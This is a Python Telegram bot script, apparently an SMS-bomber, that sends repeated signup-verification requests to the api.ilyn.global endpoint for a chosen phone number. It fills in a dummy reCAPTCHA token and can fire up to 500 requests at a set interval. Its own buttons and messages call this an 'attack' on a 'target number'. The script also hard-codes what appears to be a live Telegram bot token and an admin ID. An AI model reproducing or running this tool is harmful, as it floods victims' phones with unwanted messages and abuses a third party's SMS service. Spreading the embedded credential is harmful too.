#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ✅ RK-SYSTEM ★ ILYN SMS Request Bot (Stable Event Loop Fix)

import aiohttp
import asyncio
import json
import random
import sqlite3
from datetime import datetime
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ForceReply
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)
import nest_asyncio
nest_asyncio.apply()

# ---------------- CONFIG ----------------
BOT_TOKEN = "7719776924:AAGxCXF0as6sGihPkWrlMqmM6A7T2TKEduo"
ADMIN_ID = 6048050987
RUNNING = {}

# ---------------- DATABASE ----------------
def init_db():
    conn = sqlite3.connect("rk_history.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        start_time TEXT,
        stop_time TEXT,
        status TEXT,
        total_sent INTEGER,
        success INTEGER,
        fail INTEGER
    )''')
    conn.commit()
    conn.close()

def log_history(phone, start_time, stop_time, status, total_sent, success, fail):
    conn = sqlite3.connect("rk_history.db")
    c = conn.cursor()
    c.execute("INSERT INTO history (phone, start_time, stop_time, status, total_sent, success, fail) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (phone, start_time, stop_time, status, total_sent, success, fail))
    conn.commit()
    conn.close()

def fetch_history(limit=10):
    conn = sqlite3.connect("rk_history.db")
    c = conn.cursor()
    c.execute("SELECT * FROM history ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows

# ---------------- SECURITY ----------------
def is_admin(user_id):
    return user_id == ADMIN_ID

# ---------------- API REQUEST ----------------
async def ilyn_request(phone):
    url = "https://api.ilyn.global/auth/signup-account-verification"
    headers = {
        "Host": "api.ilyn.global",
        "Connection": "keep-alive",
        "appId": "1",
        "sec-ch-ua-platform": '"Android"',
        "currencyId": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "currencyCode": "BDT",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjO0kPoB9MCfPhwwh",
        "appCode": "ilyn-bd",
        "Origin": "https://ilyn.global",
        "Referer": "https://ilyn.global/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9"
    }

    data = f'''------WebKitFormBoundaryjO0kPoB9MCfPhwwh
Content-Disposition: form-data; name="recaptchaToken"

xyz
------WebKitFormBoundaryjO0kPoB9MCfPhwwh
Content-Disposition: form-data; name="phone"

{{"code":"BD","number":"{phone}"}}
------WebKitFormBoundaryjO0kPoB9MCfPhwwh
Content-Disposition: form-data; name="provider"

sms
------WebKitFormBoundaryjO0kPoB9MCfPhwwh--'''

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, data=data) as resp:
                text = await resp.text()
                return resp.status == 200, text
    except Exception as e:
        return False, str(e)

# ---------------- COMMANDS ----------------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Access Denied!")
        return
    kb = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="run_api")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("📜 History", callback_data="history")],
        [InlineKeyboardButton("🛑 Stop", callback_data="stop")]
    ]
    await update.message.reply_text("💥 RK-SYSTEM Control Panel", reply_markup=InlineKeyboardMarkup(kb))

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("/start - Control Panel\n/run - Manual run\n/stop - Stop current\n/status - Check status\n/history - Show last 10 logs")

# ---------------- WORKER TASK ----------------
async def run_attack(context: ContextTypes.DEFAULT_TYPE, phone: str, chat_id: int, interval: float, max_sends: int):
    start_time = datetime.utcnow().isoformat()
    total_sent = success = fail = 0
    RUNNING[phone] = True

    try:
        await context.bot.send_message(chat_id=chat_id, text=f"🚀 Starting attack for {phone}\nInterval: {interval}s | Max: {max_sends}")
        while RUNNING.get(phone) and total_sent < max_sends:
            ok, resp = await ilyn_request(phone)
            total_sent += 1
            if ok:
                success += 1
            else:
                fail += 1

            if total_sent % 10 == 0:
                await context.bot.send_message(chat_id=chat_id,
                    text=f"📦 {phone}\nSent: {total_sent} | ✅ {success} | ❌ {fail}")

            await asyncio.sleep(interval)

        status = "stopped" if RUNNING.get(phone) is False else "completed"
        stop_time = datetime.utcnow().isoformat()
        log_history(phone, start_time, stop_time, status, total_sent, success, fail)
        await context.bot.send_message(chat_id=chat_id,
            text=f"✅ Finished {phone}\nTotal: {total_sent}\nSuccess: {success}\nFail: {fail}")

    except asyncio.CancelledError:
        stop_time = datetime.utcnow().isoformat()
        log_history(phone, start_time, stop_time, "canceled", total_sent, success, fail)
        await context.bot.send_message(chat_id=chat_id,
            text=f"⚠️ Attack canceled for {phone}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id,
            text=f"❌ Error in task: {e}")
    finally:
        RUNNING.pop(phone, None)

# ---------------- CALLBACKS ----------------
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    if not is_admin(user.id):
        await query.edit_message_text("❌ You are not authorized.")
        return

    if data == "run_api":
        await query.edit_message_text("📱 Enter target number:", reply_markup=ForceReply(selective=True))
        return

    if data == "status":
        if not RUNNING:
            await query.edit_message_text("🟢 No active task.")
        else:
            text = "\n".join([f"{p} - running" for p in RUNNING.keys()])
            await query.edit_message_text(f"🔄 Active tasks:\n{text}")
        return

    if data == "history":
        rows = fetch_history()
        if not rows:
            await query.edit_message_text("📜 No history yet.")
            return
        msg = "📘 Recent History:\n\n"
        for r in rows:
            msg += f"#{r[0]} | {r[1]} | {r[4]} | Sent:{r[5]} S:{r[6]} F:{r[7]}\n"
        await query.edit_message_text(msg)
        return

    if data == "stop":
        if not RUNNING:
            await query.edit_message_text("⚪ No running job to stop.")
            return
        for p in list(RUNNING.keys()):
            RUNNING[p] = False
        await query.edit_message_text("🛑 All running tasks stopped.")
        return

# ---------------- MESSAGE HANDLER ----------------
async def msg_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        return

    if update.message.reply_to_message and "Enter target number" in (update.message.reply_to_message.text or ""):
        phone = update.message.text.strip()
        if not phone.isdigit():
            await update.message.reply_text("❌ Invalid phone number.")
            return
        context.user_data["target_phone"] = phone
        await update.message.reply_text(
            "⚙️ Enter interval(sec) & max_sends (e.g. `1 100`):",
            reply_markup=ForceReply(selective=True)
        )
        return

    if update.message.reply_to_message and "Enter interval" in (update.message.reply_to_message.text or ""):
        phone = context.user_data.get("target_phone")
        try:
            interval, max_sends = map(float, update.message.text.split())
            max_sends = int(max_sends)
        except Exception:
            await update.message.reply_text("❌ Format error. Example: 1 100")
            return

        if max_sends > 500:
            await update.message.reply_text("⚠️ Max limit 500 requests.")
            return

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ CONFIRM START", callback_data=f"confirm_start:{phone}:{interval}:{max_sends}")],
            [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
        ])
        await update.message.reply_text(
            f"Target: {phone}\nConfirm to start sending?",
            reply_markup=kb
        )
        return

# ---------------- CONFIRM CALLBACK ----------------
async def confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "cancel":
        await query.edit_message_text("🚫 Cancelled.")
        return

    if data.startswith("confirm_start:"):
        _, phone, interval, max_sends = data.split(":")
        interval = float(interval)
        max_sends = int(max_sends)
        chat_id = query.message.chat_id
        asyncio.create_task(run_attack(context, phone, chat_id, interval, max_sends))
        await query.edit_message_text(f"✅ Started task for {phone}.\nUse /status or /stop anytime.")
        return

# ---------------- MAIN ----------------
async def main():
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(menu_callback))
    app.add_handler(CallbackQueryHandler(confirm_callback, pattern="^confirm_start"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))
    print("✅ RK-SYSTEM Bot Running…")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
